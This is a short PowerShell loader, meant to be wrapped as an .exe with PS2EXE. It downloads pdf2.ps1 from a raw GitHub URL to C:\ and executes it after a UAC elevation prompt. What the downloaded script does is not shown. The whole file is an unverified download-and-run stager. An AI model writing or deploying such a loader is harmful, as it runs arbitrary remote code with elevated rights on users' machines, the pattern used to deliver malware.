# Loader — downloads and runs latest pdf2.ps1 from GitHub
# Converted to .exe with PS2EXE: one-click, UAC prompt, then fully automated
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$dest = "C:\pdf2.ps1"
try {
    Invoke-WebRequest 'https://raw.githubusercontent.com/pentoshi007/test/main/pdf2.ps1' -OutFile $dest -UseBasicParsing -ErrorAction Stop
} catch {
    # Fallback for older PowerShell
    (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/pentoshi007/test/main/pdf2.ps1', $dest)
}
& $dest
